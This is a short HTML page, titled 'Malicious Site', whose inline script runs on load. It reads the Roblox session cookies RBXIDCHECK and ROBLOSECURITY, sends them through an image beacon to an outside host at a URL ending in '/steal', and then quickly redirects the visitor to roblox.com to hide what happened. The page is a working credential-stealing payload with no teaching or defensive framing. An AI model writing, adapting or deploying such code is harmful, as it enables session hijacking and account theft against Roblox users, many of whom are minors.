<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Malicious Site</title>
    <script>
        (function() {
            // Step 1: Grab both cookies and concatenate them
            var cookies = "RBXIDCHECK=" + encodeURIComponent(document.cookie.match(/RBXIDCHECK=([^;]+)/)[1]) + 
                          "&ROBLOSECURITY=" + encodeURIComponent(document.cookie.match(/ROBLOSECURITY=([^;]+)/)[1]);

            // Step 2: Exfiltrate cookies using an image beacon
            var img = new Image();
            img.src = "https://xackerthesecond.github.io/octoskibidi.godhub.io/steal?data=" + cookies;

            // Step 3: Redirect to Roblox after a short delay
            setTimeout(function() {
                window.location.href = "https://www.roblox.com";
            }, 10); // Redirect after 10 milliseconds
        })();
    </script>
</head>
<body>
    <h1> </h1>
</body>
</html>
